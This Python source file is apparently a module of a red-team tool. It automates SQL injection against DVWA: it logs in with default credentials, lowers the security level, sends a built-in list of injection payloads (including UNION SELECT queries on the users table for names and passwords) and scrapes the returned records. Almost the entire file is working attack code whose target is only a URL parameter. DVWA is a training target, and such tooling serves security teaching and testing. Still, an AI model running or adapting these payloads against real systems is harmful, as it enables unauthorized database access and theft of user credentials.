"""
SQL Injection Attack Module
Performs REAL SQL injection attacks against DVWA with improved data extraction
"""
import time
import requests
from datetime import datetime
import re
from bs4 import BeautifulSoup

class SQLInjectionAttack:
    def __init__(self, target, parameters):
        self.target = target
        self.parameters = parameters
        self.intensity = parameters.get('intensity', 'medium')
        self.payloads = parameters.get('payloads', [])
        self.aborted = False
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': 'RedTeam-SQLInjection/1.0'})
        self.dvwa_authenticated = False
        self.results = {
            'vulnerabilities_found': [],
            'data_extracted': [],
            'success': False,
            'attempts': 0
        }
        
        # Effective DVWA payloads
        if not self.payloads:
            self.payloads = [
                "1' OR '1'='1",
                "1' OR 1=1#",
                "1' OR 1=1--",
                "1' UNION SELECT null, concat(first_name,0x0a,last_name) FROM users#",
                "1' UNION SELECT user, password FROM users#",
                "' OR '1'='1' #",
                "1' OR '1'='1' -- ",
                "1' UNION SELECT null, database()#"
            ]
    
    def execute(self):
        """Execute SQL injection attack"""
        yield {
            'message': '🚀 Starting REAL SQL Injection attack on DVWA',
            'progress': 0,
            'status': 'initializing',
            'packets_sent': 0
        }
        
        # Authenticate with DVWA
        auth_success = self._authenticate_dvwa()
        if auth_success:
            yield {
                'message': '🔑 Successfully authenticated with DVWA',
                'progress': 10,
                'status': 'authenticated'
            }
        else:
            yield {
                'message': '⚠️ Authentication warning - continuing with attack',
                'progress': 10,
                'status': 'warning'
            }
        
        time.sleep(0.5)
        
        total_payloads = len(self.payloads)
        attempts = 0
        
        for i, payload in enumerate(self.payloads):
            if self.aborted:
                yield {'message': 'Attack aborted', 'status': 'aborted'}
                break
            
            attempts += 1
            self.results['attempts'] = attempts
            
            yield {
                'message': f'💉 Testing payload: {payload[:50]}...',
                'progress': 10 + int((i + 1) / total_payloads * 70),
                'status': 'testing',
                'payload': payload,
                'packets_sent': attempts
            }
            
            try:
                # Construct injection URL
                if '?' in self.target:
                    inject_url = f"{self.target}&id={requests.utils.quote(payload)}&Submit=Submit"
                else:
                    inject_url = f"{self.target}?id={requests.utils.quote(payload)}&Submit=Submit"
                
                # Send attack request
                response = self.session.get(inject_url, timeout=5)
                
                # Debug: Save response for analysis
                print(f"\n[DEBUG] Payload: {payload}")
                print(f"[DEBUG] URL: {inject_url}")
                print(f"[DEBUG] Response Status: {response.status_code}")
                print(f"[DEBUG] Response Length: {len(response.text)}")
                
                # Analyze response
                vulnerability_found, extracted_data = self._analyze_response(response, payload)
                
                if vulnerability_found:
                    vulnerability = {
                        'type': 'SQL Injection',
                        'payload': payload,
                        'parameter': 'id',
                        'severity': 'Critical',
                        'timestamp': datetime.now().isoformat(),
                        'response_code': response.status_code,
                        'url': inject_url,
                        'evidence': f'{len(extracted_data)} records extracted' if extracted_data else 'Multiple rows returned'
                    }
                    self.results['vulnerabilities_found'].append(vulnerability)
                    
                    yield {
                        'message': f'🎯 VULNERABILITY CONFIRMED! Payload worked: {payload[:40]}',
                        'progress': 10 + int((i + 1) / total_payloads * 70),
                        'status': 'vulnerability_found',
                        'vulnerability': vulnerability,
                        'packets_sent': attempts
                    }
                    
                    # If data was extracted
                    if extracted_data:
                        data_entry = {
                            'type': 'user_credentials',
                            'data': extracted_data,
                            'timestamp': datetime.now().isoformat(),
                            'source': 'DVWA Database',
                            'payload_used': payload,
                            'records_count': len(extracted_data)
                        }
                        self.results['data_extracted'].append(data_entry)
                        
                        yield {
                            'message': f'📊 DATA EXTRACTED! {len(extracted_data)} user records from DVWA database',
                            'progress': 10 + int((i + 1) / total_payloads * 70),
                            'status': 'data_extracted',
                            'extracted_data': data_entry,
                            'packets_sent': attempts
                        }
                        
                        time.sleep(0.8)
                
            except requests.exceptions.Timeout:
                yield {
                    'message': f'⏱️ Request timeout',
                    'progress': 10 + int((i + 1) / total_payloads * 70),
                    'status': 'timeout',
                    'packets_sent': attempts
                }
            except Exception as e:
                print(f"[DEBUG] Error: {e}")
                yield {
                    'message': f'❌ Error: {str(e)[:50]}',
                    'progress': 10 + int((i + 1) / total_payloads * 70),
                    'status': 'error',
                    'packets_sent': attempts
                }
            
            time.sleep(0.4)
        
        # Final summary
        self.results['success'] = len(self.results['vulnerabilities_found']) > 0
        
        total_records = sum([len(d['data']) for d in self.results['data_extracted']])
        
        yield {
            'message': f'✅ Attack completed. Found {len(self.results["vulnerabilities_found"])} vulnerabilities, extracted {total_records} records',
            'progress': 100,
            'status': 'completed',
            'packets_sent': attempts,
            'vulnerabilities_count': len(self.results['vulnerabilities_found']),
            'data_extracted_count': total_records
        }
    
    def _authenticate_dvwa(self):
        """Authenticate with DVWA"""
        try:
            # Extract base URL
            if '/vulnerabilities/' in self.target:
                base_url = self.target.split('/vulnerabilities/')[0]
            else:
                base_url = self.target.rstrip('/')
            
            # Get login page for session
            self.session.get(f"{base_url}/login.php", timeout=5)
            
            # Login
            login_data = {
                'username': 'admin',
                'password': 'password',
                'Login': 'Login'
            }
            response = self.session.post(f"{base_url}/login.php", data=login_data, timeout=5)
            
            # Set security to low
            self.session.get(f"{base_url}/security.php?security=low&seclev_submit=Submit", timeout=5)
            
            self.dvwa_authenticated = True
            print("[DEBUG] DVWA authentication successful")
            return True
            
        except Exception as e:
            print(f"[DEBUG] DVWA authentication failed: {e}")
            return False
    
    def _analyze_response(self, response, payload):
        """Analyze response for SQL injection success and extract data - IMPROVED"""
        html = response.text
        html_lower = html.lower()
        
        # Check for SQL injection success
        vulnerability_found = False
        extracted_data = []
        
        # Method 1: Count database records (DVWA specific)
        first_name_count = html_lower.count('first name:')
        surname_count = html_lower.count('surname:')
        
        print(f"[DEBUG] First name count: {first_name_count}, Surname count: {surname_count}")
        
        if first_name_count > 1 or surname_count > 1:
            vulnerability_found = True
            
            # Extract actual data using BeautifulSoup
            extracted_data = self._extract_user_data_improved(html)
            print(f"[DEBUG] Extracted {len(extracted_data)} users")
        
        # Method 2: Check for SQL errors
        if not vulnerability_found:
            if any(err in html_lower for err in ['sql', 'mysql', 'syntax error', 'database']):
                vulnerability_found = True
                print("[DEBUG] SQL error detected in response")
        
        # Method 3: Check for UNION SELECT success
        if 'union' in payload.lower() and len(html) > 500:
            vulnerability_found = True
            if not extracted_data:
                extracted_data = self._extract_union_data(html)
            print(f"[DEBUG] UNION injection detected, extracted {len(extracted_data)} items")
        
        return vulnerability_found, extracted_data
    
    def _extract_user_data_improved(self, html):
        """Extract user data from DVWA response - IMPROVED with BeautifulSoup"""
        users = []
        
        try:
            # Try BeautifulSoup parsing first
            soup = BeautifulSoup(html, 'html.parser')
            
            # Find all text content
            text_content = soup.get_text()
            
            # Pattern: ID: X First name: Y Surname: Z
            pattern = r'ID:\s*(\d+)\s+First name:\s*([^\n]+)\s+Surname:\s*([^\n]+)'
            matches = re.findall(pattern, text_content, re.IGNORECASE)
            
            for match in matches:
                users.append({
                    'id': match[0].strip(),
                    'first_name': match[1].strip(),
                    'surname': match[2].strip()
                })
            
            print(f"[DEBUG] Regex matches found: {len(matches)}")
            
            # If that didn't work, try HTML parsing
            if not users:
                # Look for pre or div elements containing results
                for element in soup.find_all(['pre', 'div', 'p']):
                    text = element.get_text()
                    if 'ID:' in text and 'First name:' in text:
                        lines = text.split('\n')
                        current_user = {}
                        
                        for line in lines:
                            line = line.strip()
                            if line.startswith('ID:'):
                                if current_user:
                                    users.append(current_user)
                                current_user = {'id': line.replace('ID:', '').strip()}
                            elif line.startswith('First name:'):
                                current_user['first_name'] = line.replace('First name:', '').strip()
                            elif line.startswith('Surname:'):
                                current_user['surname'] = line.replace('Surname:', '').strip()
                        
                        if current_user and 'first_name' in current_user:
                            users.append(current_user)
            
            # Last resort: regex on raw HTML
            if not users:
                pattern = r'ID:\s*(\d+)<br\s*/?>First name:\s*([^<]+)<br\s*/?>Surname:\s*([^<]+)'
                matches = re.findall(pattern, html, re.IGNORECASE)
                
                for match in matches:
                    users.append({
                        'id': match[0].strip(),
                        'first_name': match[1].strip(),
                        'surname': match[2].strip()
                    })
            
        except Exception as e:
            print(f"[DEBUG] Extraction error: {e}")
        
        return users
    
    def _extract_union_data(self, html):
        """Extract data from UNION SELECT results - IMPROVED"""
        data = []
        
        try:
            soup = BeautifulSoup(html, 'html.parser')
            
            # Look for pre tags containing results
            for pre in soup.find_all('pre'):
                text = pre.get_text().strip()
                if text and len(text) > 2:
                    # Split by newlines or breaks
                    lines = text.split('\n')
                    for line in lines:
                        line = line.strip()
                        if line and not line.startswith('ID:') and not line.startswith('First name:'):
                            # This might be extracted data
                            if len(line) > 3 and len(line) < 100:
                                data.append({'extracted_value': line})
            
            # Also check divs
            if not data:
                for div in soup.find_all('div'):
                    text = div.get_text().strip()
                    lines = text.split('\n')
                    for line in lines:
                        line = line.strip()
                        if line and 'first name' not in line.lower() and 'surname' not in line.lower():
                            if 5 < len(line) < 100:
                                data.append({'extracted_value': line})
        
        except Exception as e:
            print(f"[DEBUG] Union extraction error: {e}")
        
        # Remove duplicates and filter garbage
        seen = set()
        filtered_data = []
        for item in data:
            val = item['extracted_value']
            if val not in seen and not val.startswith('<') and not val.startswith('>'):
                seen.add(val)
                filtered_data.append(item)
        
        return filtered_data[:10]  # Limit to first 10 unique items
    
    def get_results(self):
        """Get attack results"""
        return self.results
    
    def abort(self):
        """Abort the attack"""
        self.aborted = True